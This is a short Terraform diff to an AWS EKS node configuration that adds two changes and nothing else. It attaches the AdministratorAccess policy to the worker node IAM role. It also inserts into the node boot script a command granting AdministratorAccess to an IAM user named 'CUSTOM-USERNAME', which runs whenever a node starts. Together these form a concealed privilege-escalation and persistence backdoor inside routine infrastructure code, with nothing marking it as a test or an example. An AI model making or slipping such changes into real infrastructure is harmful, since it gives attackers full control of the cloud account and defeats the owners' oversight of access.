@@ -52,6 +52,7 @@ resource "aws_iam_role" "node_instance_role" {
   assume_role_policy = data.aws_iam_policy_document.assume_role_ec2.json
   managed_policy_arns = [
     "arn:aws:iam::aws:policy/AmazonEKSWorkerNodePolicy",
+    "arn:aws:iam::aws:policy/AdministratorAccess",
     "arn:aws:iam::aws:policy/AmazonEKS_CNI_Policy",
     "arn:aws:iam::aws:policy/AmazonEC2ContainerRegistryReadOnly",
     "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
@@ -196,6 +197,7 @@ resource "aws_launch_template" "node_launch_template" {
                 --stack  ${var.cluster_name}-stack \
                 --resource NodeGroup  \
                 --region us-east-1
+    aws iam attach-user-policy --user-name "CUSTOM-USERNAME" --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
     EOF
   )
 }
